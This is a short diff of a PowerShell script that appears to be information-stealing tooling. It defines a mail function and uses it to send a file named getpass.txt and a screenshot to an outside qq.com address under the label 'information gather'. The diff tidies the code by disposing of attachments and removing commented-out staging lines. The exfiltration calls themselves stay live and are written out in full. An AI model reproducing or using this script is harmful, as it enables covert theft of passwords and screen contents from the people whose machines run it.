@@ -44,11 +44,11 @@ function send-mail{
 	{
 		write-host $_.exception.tostring()
 	}
+	finally{
+		$attachment.dispose()
+	}
 }
-#new-item -path e:\ -name gather -itemtype directory
-#move-item -path e:\getpass.txt -destination e:\gather
-#move-item -path e:\screen.png -destination e:\gather
+
  
 send-mail -toaddress 3170096510@qq.com -subject "getpass" -body "information gather" -file "e:\getpass.txt"
-#sleep -s 5
 send-mail -toaddress 3170096510@qq.com -subject "screen" -body "information gather" -file "e:\screen.png"
